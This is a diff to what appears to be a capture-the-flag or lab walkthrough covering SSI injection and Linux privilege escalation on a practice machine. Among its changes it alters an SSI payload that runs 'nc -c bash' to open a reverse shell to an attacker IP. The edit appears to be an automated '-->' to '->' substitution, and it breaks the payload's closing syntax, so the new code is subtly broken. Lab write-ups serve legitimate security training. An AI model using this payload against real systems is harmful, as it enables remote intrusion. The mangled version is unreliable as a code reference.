@@ -33,7 +33,7 @@ $ smbmap -H 192.168.201.149
 
 It is thus likely that there's a web exploit, so we can start proxying traffic through Burpsuite.&#x20;
 
-### Web Enum --> SSI Injection
+### Web Enum -> SSI Injection
 
 Port 80 was running a custom dashboard:
 
@@ -74,14 +74,14 @@ If we follow the redirect, we get this:
 We now have RCE on the machine, and we can easily get a reverse shell using this:
 
 ```
-<!--#exec cmd='nc -c bash 192.168.45.189 21' -->
+<!--#exec cmd='nc -c bash 192.168.45.189 21' ->
 ```
 
 <figure><img src="../../../.gitbook/assets/image (3082).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
-### GPG Creds --> Mindsflee Shell
+### GPG Creds -> Mindsflee Shell
 
 Within the `/home/mindsflee` directory, there are some files of interest:
 
@@ -140,7 +140,7 @@ Using this password, we can `su` to `mindsflee`.
 
 <figure><img src="../../../.gitbook/assets/image (3172).png" alt=""><figcaption></figcaption></figure>
 
-### Sudo Privileges --> Socket Injection
+### Sudo Privileges -> Socket Injection
 
 The `mindsflee` user can use `sudo` with the Python script we found:
 
